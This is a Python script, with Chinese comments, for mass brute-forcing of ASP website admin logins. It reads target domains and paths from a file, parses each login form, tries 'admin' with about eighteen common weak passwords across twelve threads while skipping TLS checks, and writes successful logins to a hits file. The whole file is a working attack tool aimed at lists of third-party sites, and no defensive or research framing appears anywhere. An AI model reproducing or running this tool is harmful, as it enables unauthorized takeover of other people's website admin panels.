#!/usr/bin/env python3
"""bf_asp_fast.py - ASP后台快速爆破(表单缓存版)
每个目标: 1次GET分析表单 → N次POST试密码
"""
import urllib.request, urllib.parse, ssl, re, sys, time
from concurrent.futures import ThreadPoolExecutor, as_completed

ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
UA = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "X-Requested-With": "XMLHttpRequest"}

PASSWORDS = ["admin", "admin123", "123456", "admin888", "12345678", "password",
             "admin@123", "admin1234", "123456a", "a123456", "666666", "888888",
             "000000", "qwer1234", "abc123", "123123", "111111", "admin666"]

def fetch(url, timeout=8, data=None):
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None,
            headers={**UA, "Content-Type": "application/x-www-form-urlencoded"} if data else UA)
        r = urllib.request.urlopen(req, timeout=timeout, context=ctx)
        return r.status, r.read(60000).decode("utf-8", "ignore"), r.geturl()
    except urllib.error.HTTPError as e:
        return e.code, e.read(60000).decode("utf-8", "ignore"), e.geturl()
    except Exception:
        return 0, "", ""

def analyze(target):
    dom, path = target
    url = "http://" + dom + path
    st, body, _ = fetch(url)
    if st != 200 or len(body) < 300:
        return None, url
    fields = re.findall(r'<input[^>]*name="([^"]+)"[^>]*>', body, re.I)
    if not fields:
        fields = re.findall(r'name="([^"]+)"', body)
    action = re.search(r'<form[^>]*action="([^"]*)"', body, re.I)
    form_action = action.group(1) if action else path
    if not form_action.startswith("http"):
        base = "http://" + dom
        form_action = base + (form_action if form_action.startswith("/") else "/" + form_action)
    # 判断登录成功/失败标志
    fail_marks = ["错误", "失败", "不正确", "invalid", "error", "wrong", "fail"]
    return {"url": form_action, "fields": fields, "body": body, "fail_marks": fail_marks}, url

def brute_one(target):
    info, login_url = analyze(target)
    if info is None:
        return None
    fields = info["fields"]
    uf = next((f for f in ["username", "user", "name", "account", "admin"] if f in fields), "username")
    pf = next((f for f in ["password", "pwd", "pass", "passwd"] if f in fields), "password")
    # 登录成功标志: 响应不含失败标志 且 (跳转 或 出现后台特征)
    for pw in PASSWORDS:
        data = {f: "" for f in fields}
        data[uf] = "admin"
        data[pf] = pw
        st, resp, fu = fetch(info["url"], data=data)
        if st == 0:
            continue
        has_fail = any(m in resp for m in info["fail_marks"])
        if not has_fail:
            # 302跳转(非登录页) 或 后台特征
            if st == 302 and "login" not in fu.lower():
                return (target[0], target[1], "admin", pw, "302:%s" % fu[:60])
            if any(k in resp.lower() for k in ["logout", "退出", "管理首页", "欢迎", "dashboard", "main"]):
                if len(resp) > 500:
                    return (target[0], target[1], "admin", pw, "body-mark")
    return None

def main():
    targets = []
    with open("/tmp/asp_targets_new.txt") as f:
        for line in f:
            line = line.strip()
            if line and "\t" in line:
                p = line.split("\t")
                targets.append((p[0], p[1]))
    print("targets: %d" % len(targets), flush=True)

    hits = []
    with ThreadPoolExecutor(max_workers=12) as ex:
        futs = {ex.submit(brute_one, t): t for t in targets}
        for fu in as_completed(futs):
            try:
                r = fu.result()
            except Exception:
                r = None
            if r:
                hits.append(r)
                print("!!! HIT: %s" % "\t".join(str(x) for x in r), flush=True)
            else:
                t = futs[fu]
                print(". %s" % t[0], flush=True)

    with open("/tmp/asp_hits.txt", "w") as f:
        for h in hits:
            f.write("\t".join(str(x) for x in h) + "\n")
    print("=== DONE: %d hits ===" % len(hits), flush=True)

if __name__ == "__main__":
    main()
